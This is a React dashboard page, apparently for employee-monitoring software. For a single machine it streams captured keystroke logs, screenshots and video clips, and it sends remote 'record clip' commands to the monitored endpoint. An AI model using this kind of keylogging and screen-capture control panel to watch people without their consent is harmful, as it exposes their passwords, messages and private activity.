import { useEffect, useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Play, Loader2, Settings, Wifi, WifiOff } from 'lucide-react';

export default function EmployeeDetail() {
    const { id } = useParams();
    const navigate = useNavigate();
    const [employee, setEmployee] = useState(null);
    const [keylogs, setKeylogs] = useState([]);
    const [screenshots, setScreenshots] = useState([]);
    const [videos, setVideos] = useState([]);
    const [requestingVideo, setRequestingVideo] = useState(false);
    const [isOnline, setIsOnline] = useState(false);

    // Settings
    const [settings, setSettings] = useState({ screenshot_interval: 300, video_duration: 10 });
    const [savingSettings, setSavingSettings] = useState(false);

    useEffect(() => {
        fetchEmployee();
        fetchInitialData();

        const sub = supabase.channel(`employee-${id}`)
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'keylogs', filter: `employee_id=eq.${id}` },
                payload => setKeylogs(prev => [payload.new, ...prev]))
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'screenshots', filter: `employee_id=eq.${id}` },
                payload => setScreenshots(prev => [resolveUrl(payload.new, 'screenshots'), ...prev]))
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'videos', filter: `employee_id=eq.${id}` },
                payload => setVideos(prev => [resolveUrl(payload.new, 'videos'), ...prev]))
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'commands', filter: `employee_id=eq.${id}` },
                payload => {
                    if (payload.new.command_type === 'RECORD_CLIP' && payload.new.status === 'EXECUTED') {
                        setRequestingVideo(false);
                        // alert("Video clip ready!"); 
                    }
                })
            // Listen for presence/status updates if implemented, or infer from activity
            .subscribe();

        // Simple online check based on last_seen
        const interval = setInterval(() => {
            if (employee?.last_seen) {
                const lastSeen = new Date(employee.last_seen);
                const now = new Date();
                const diff = (now - lastSeen) / 1000;
                setIsOnline(diff < 60); // Online if seen in last 60s
            }
        }, 5000);

        return () => {
            supabase.removeChannel(sub);
            clearInterval(interval);
        }
    }, [id, employee?.last_seen]);

    const resolveUrl = (item, bucket) => ({
        ...item,
        publicUrl: item.url.startsWith('http') ? item.url : supabase.storage.from(bucket).getPublicUrl(item.storage_path).data.publicUrl
    });

    const fetchEmployee = async () => {
        const { data } = await supabase.from('employees').select('*').eq('id', id).single();
        if (data) {
            setEmployee(data);
            if (data.settings) setSettings(data.settings);

            // Initial online check
            const lastSeen = new Date(data.last_seen);
            const now = new Date();
            setIsOnline((now - lastSeen) / 1000 < 60);
        }
    };

    const fetchInitialData = async () => {
        const k = await supabase.from('keylogs').select('*').eq('employee_id', id).order('captured_at', { ascending: false }).limit(50);
        if (k.data) setKeylogs(k.data);

        const s = await supabase.from('screenshots').select('*').eq('employee_id', id).order('created_at', { ascending: false }).limit(20);
        if (s.data) setScreenshots(s.data.map(i => resolveUrl(i, 'screenshots')));

        const v = await supabase.from('videos').select('*').eq('employee_id', id).order('created_at', { ascending: false }).limit(10);
        if (v.data) setVideos(v.data.map(i => resolveUrl(i, 'videos')));
    };

    const requestVideoClip = async () => {
        setRequestingVideo(true);
        await supabase.from('commands').insert({
            employee_id: id,
            command_type: 'RECORD_CLIP',
            payload: {}
        });
    };

    const saveSettings = async () => {
        setSavingSettings(true);
        await supabase.from('employees').update({ settings }).eq('id', id);
        setSavingSettings(false);
        alert('Settings saved. Sync pending...');
    };

    if (!employee) return <div className="p-8">Loading...</div>;

    return (
        <div className="p-8 max-w-7xl mx-auto space-y-6">
            <div className="flex items-center justify-between">
                <button onClick={() => navigate('/')} className="flex items-center text-gray-500 hover:text-gray-900">
                    <ArrowLeft className="w-5 h-5 mr-1" /> Back
                </button>
                <div className="flex items-center gap-4">
                    <h1 className="text-2xl font-bold flex items-center gap-2">
                        {employee.hostname}
                        {isOnline ?
                            <span className="flex items-center gap-1 text-green-600 text-sm bg-green-100 px-2 py-0.5 rounded-full"><Wifi className="w-4 h-4" /> Online</span> :
                            <span className="flex items-center gap-1 text-gray-500 text-sm bg-gray-100 px-2 py-0.5 rounded-full"><WifiOff className="w-4 h-4" /> Offline</span>
                        }
                    </h1>
                </div>
            </div>

            {/* Settings Panel */}
            <div className="bg-white p-4 rounded-xl shadow border border-gray-100 flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-2 font-semibold text-gray-700">
                    <Settings className="w-5 h-5" /> Sync Configuration
                </div>
                <div className="flex items-center gap-4">
                    <label className="flex items-center gap-2 text-sm text-gray-600">
                        Screenshots every (sec):
                        <input
                            type="number"
                            value={settings.screenshot_interval}
                            onChange={e => setSettings({ ...settings, screenshot_interval: parseInt(e.target.value) })}
                            className="border rounded p-1 w-20"
                        />
                    </label>
                    <label className="flex items-center gap-2 text-sm text-gray-600">
                        Video Duration (sec):
                        <input
                            type="number"
                            value={settings.video_duration}
                            onChange={e => setSettings({ ...settings, video_duration: parseInt(e.target.value) })}
                            className="border rounded p-1 w-20"
                        />
                    </label>
                    <button
                        onClick={saveSettings}
                        disabled={savingSettings}
                        className="bg-blue-600 text-white px-3 py-1 rounded hover:bg-blue-700 text-sm disabled:opacity-50"
                    >
                        {savingSettings ? 'Saving...' : 'Save & Sync'}
                    </button>
                </div>
                <button
                    onClick={requestVideoClip}
                    disabled={requestingVideo}
                    className={`flex items-center px-4 py-2 text-white rounded-lg transition ml-auto ${requestingVideo ? 'bg-gray-400' : 'bg-red-600 hover:bg-red-700'}`}
                >
                    {requestingVideo ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Video className="w-4 h-4 mr-2" />}
                    {requestingVideo ? 'Recording...' : 'Request Clip'}
                </button>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">

                {/* Videos Column */}
                <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                    <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
                        <Video className="w-5 h-5 mr-2" /> Video Clips (Synced)
                    </h2>
                    <div className="space-y-4 max-h-[600px] overflow-y-auto">
                        {videos.map(vid => (
                            <div key={vid.id} className="border rounded p-2">
                                <video src={vid.publicUrl} controls className="w-full rounded bg-black" />
                                <span className="text-xs text-gray-500 block mt-1">{new Date(vid.created_at).toLocaleString()}</span>
                            </div>
                        ))}
                    </div>
                </div>

                {/* Screenshots Gallery */}
                <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                    <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
                        <ImageIcon className="w-5 h-5 mr-2" /> Screenshots (Synced)
                    </h2>
                    <div className="grid grid-cols-2 gap-4 max-h-[600px] overflow-y-auto">
                        {screenshots.map(shot => (
                            <a key={shot.id} href={shot.publicUrl} target="_blank" rel="noreferrer" className="block group">
                                <div className="relative">
                                    <img src={shot.publicUrl} alt="Screenshot" className="w-full h-auto rounded border group-hover:opacity-90 transition" />
                                </div>
                                <span className="text-xs text-gray-500 block mt-1">{new Date(shot.created_at).toLocaleTimeString()}</span>
                            </a>
                        ))}
                    </div>
                </div>

                {/* Keylogs Feed */}
                <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                    <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
                        <Keyboard className="w-5 h-5 mr-2" /> Keylogs (History)
                    </h2>
                    <div className="bg-gray-50 p-4 rounded-lg font-mono text-sm h-[600px] overflow-y-auto space-y-4">
                        {keylogs.map(log => (
                            <div key={log.id} className="border-b border-gray-200 pb-2">
                                <span className="text-xs text-gray-400 block mb-1">{new Date(log.captured_at).toLocaleString()}</span>
                                <div className="whitespace-pre-wrap break-words">{log.content}</div>
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </div>
    );
}
